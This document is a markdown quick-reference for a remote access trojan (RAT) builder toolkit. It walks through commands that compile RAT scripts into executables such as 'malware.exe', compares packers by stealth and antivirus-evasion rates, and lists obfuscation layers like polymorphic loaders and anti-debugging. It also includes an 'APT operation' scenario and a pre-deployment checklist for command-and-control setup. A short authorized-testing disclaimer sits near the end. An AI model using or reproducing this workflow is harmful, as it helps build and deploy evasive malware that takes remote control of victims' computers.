# RAT EXECUTABLE BUILDER - QUICK REFERENCE

## TL;DR - Quick Commands

### Fastest Way to Build
```bash
# Interactive menu (recommended)
python3 master_rat_builder.py
```

### Direct Builder Commands

**Fast Build (1-3 min, 75 MB):**
```bash
python3 rat_executable_builder.py rat_ultimate.py -o payload
```

**Best Stealth (5-15 min, 25 MB):**
```bash
python3 nuitka_rat_builder.py rat_ultimate.py -o payload
```

**Heavy Obfuscation (3-5 min, 85 MB):**
```bash
python3 hybrid_rat_builder.py rat_ultimate.py -o payload -a
```

**Advanced Custom (manual):**
```bash
python3 stub_packer_builder.py rat_ultimate.py -o payload
```

---

## Strategy Selection Matrix

```
CHOOSE:              IF YOU NEED:
────────────────────────────────────────────
PyInstaller         → Quick deployment, any platform
Nuitka              → Best stealth, smallest file
Hybrid              → Production use, balanced
Stub Packer         → Maximum customization
```

---

## Full Build Process (Step by Step)

### 1. Start Interactive Builder
```bash
python3 master_rat_builder.py
```

### 2. Select RAT File
```
[*] Available RAT files:
  1. rat_ultimate.py
  2. rat_server_fixed.py
  3. rat_server_whatsapp.py
  4. nexus-c2-sample.py
  0. Custom file
→ Choose: 1
```

### 3. Select Strategy
```
[*] Build Strategies:
  1. PyInstaller (fast, 75 MB)
  2. Nuitka (stealthy, 25 MB)
  3. Hybrid (obfuscated, 85 MB)
  4. Stub Packer (custom)
→ Choose: 2
```

### 4. Configure Output
```
Output executable name [rat_payload]: malware
Enable maximum obfuscation? [y/N]: y
Enable UPX packing? [y/N]: y
```

### 5. Confirm & Build
```
Proceed with build? [Y/n]: y
[✓] Starting build...
[✓] EXECUTABLE CREATED: dist/malware.exe
```

---

## Output Locations

```
After successful build:
dist/malware.exe           ← Final executable (use this)
build/                     ← Build artifacts
dist/malware/              ← (if --onedir mode)
```

---

## Obfuscation Levels

### Level 1: Basic (PyInstaller default)
- Binary wrapping
- Basic entropy

### Level 2: Advanced (-a flag)
- Control flow flattening
- Junk code injection
- String encoding
- Entropy manipulation

### Level 3: Hybrid
- All Level 2
- Multi-layer encryption
- Polymorphic loader
- Anti-debugging

### Level 4: Nuitka
- True C compilation
- Machine code
- Optimization
- Hardest to reverse

---

## Common Scenarios

### Scenario 1: Quick Red Team Deployment
```bash
python3 rat_executable_builder.py rat_ultimate.py -o rt_payload
# 2-3 minutes, ready to deploy
```

### Scenario 2: Long-Term APT Operation
```bash
python3 nuitka_rat_builder.py rat_ultimate.py -o apt_payload
# 10-15 minutes, maximum stealth
```

### Scenario 3: Production/Defense
```bash
python3 hybrid_rat_builder.py rat_ultimate.py -o prod_payload -a
# 3-5 minutes, balanced approach
```

### Scenario 4: Evasion Testing
```bash
# First build with Hybrid
python3 hybrid_rat_builder.py rat_ultimate.py -o stage1 -a

# Then compile with Nuitka
python3 nuitka_rat_builder.py stage1.py -o final_payload
```

---

## Installation & Dependencies

### First Time Setup

```bash
# 1. Configure Python environment
python3 -m venv .venv
source .venv/bin/activate

# 2. Install required packages
pip install pyinstaller cryptography requests pycryptodome

# 3. (Optional) Install Nuitka for best stealth
pip install nuitka

# 4. (Optional) Install C compiler
# Linux: sudo apt-get install build-essential
# macOS: xcode-select --install
# Windows: Visual C++ Build Tools
```

### One-Line Setup
```bash
pip install pyinstaller cryptography requests pycryptodome nuitka && python3 master_rat_builder.py
```

---

## Output Quality Indicators

### Good Build Signs ✓
```
[✓] Source code read successfully
[✓] Obfuscation layers applied
[✓] Compilation successful
[✓] Post-processing complete
[✓] EXECUTABLE CREATED
```

### Bad Build Signs ✗
```
[✗] Source not found
[✗] Compilation failed
[✗] PyInstaller timeout
[✗] Missing dependencies
```

---

## File Size Reference

| Builder | RAT File | Output Size |
|---------|----------|------------|
| PyInstaller | rat_ultimate (62 KB) | ~75 MB |
| Nuitka | rat_ultimate (62 KB) | ~25 MB |
| Hybrid | rat_ultimate (62 KB) | ~85 MB |
| Stub | rat_ultimate (62 KB) | ~5 MB (wrapper only) |

---

## Execution Verification

### After Build:

```bash
# Verify executable exists
ls -lh dist/*.exe

# Check file type
file dist/malware.exe

# Check basic functionality (if safe)
# Never run on main system!
```

---

## Troubleshooting Checklist

| Issue | Solution |
|-------|----------|
| "No module named pyinstaller" | `pip install pyinstaller` |
| "No C++ compiler" | Install Visual C++ Build Tools |
| Build timeout | Use Nuitka or increase timeout |
| Crash on execution | Verify dependencies in wrapper |
| AV detection | Use higher obfuscation level |

---

## AV Evasion Ratings

```
PyInstaller:  ████████░░ 80%
Hybrid:       █████████░ 90%
Nuitka:       ██████████ 95%
Stub Packer:  ██████████ 98%
```

---

## Security Reminders

⚠️ **Before Deploy:**
- [ ] Test in isolated environment
- [ ] Verify functionality
- [ ] Check for crashes
- [ ] Verify obfuscation applied
- [ ] Update C2 configuration
- [ ] Test C2 communication

⚠️ **Legal Compliance:**
- [ ] Authorized testing only
- [ ] Document client approval
- [ ] Follow ROE (Rules of Engagement)
- [ ] No unauthorized access

---

## Support Matrix

| Feature | PyInstaller | Nuitka | Hybrid | Stub |
|---------|------------|--------|--------|------|
| Windows | ✓ | ✓ | ✓ | ✓ |
| Linux | ✓ | ✓ | ✓ | ✗ |
| macOS | ✓ | ✓ | ✓ | ✗ |
| Obfuscation | Basic | Good | Excellent | Custom |
| Compilation Speed | Fast | Slow | Medium | Manual |
| Output Size | Large | Small | Medium | Tiny |

---

**Last Updated:** December 9, 2025
**Version:** 2.0
**Status:** Ready for Production
